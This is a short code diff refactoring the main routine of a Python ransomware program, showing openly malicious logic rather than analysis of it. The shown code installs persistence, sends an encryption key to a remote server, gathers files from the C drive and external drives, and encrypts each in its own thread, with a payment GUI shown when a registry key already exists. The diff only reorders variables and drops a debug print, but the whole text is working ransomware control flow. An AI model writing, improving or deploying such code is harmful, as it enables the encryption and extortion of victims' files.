@@ -22,6 +22,10 @@ if registry_key_exists:
     # Launch the GUI
     Gui.payment_function(path)
 else:
+    # initialize variables
+    i = 1
+    main_thread = threading.currentThread()
+
     # Create the persistence
     Persistence.create_persistence(is_admin)
 
@@ -30,23 +34,13 @@ else:
     # Sending the key to the remote server
     Client.send_key(key)
 
-    # Variable for debugging, to remove later
-    i = 1
-    main_thread = threading.currentThread()
-
     # Return a list of non encrypt files and their path
-    list_all_files = []
-    non_encrypt_files_C = Crypto_files.list_files(path)
-    list_hdd = List_external_HDD.list_hdd_files()
-
-    list_all_files = list_hdd + non_encrypt_files_C
-
+    list_all_files = List_external_HDD.list_hdd_files() + Crypto_files.list_files(path)
 
     # Loop through the files
     for non_encrypt_file in list_all_files:
         # Create a thread for each file to accelerate the process
         Thread = Crypto_files.generate_thread(i, key, non_encrypt_file)
-        print(threading.enumerate())
         # Call the "run()" method from the "generateThread()" class
         Thread.start()
         i += 1
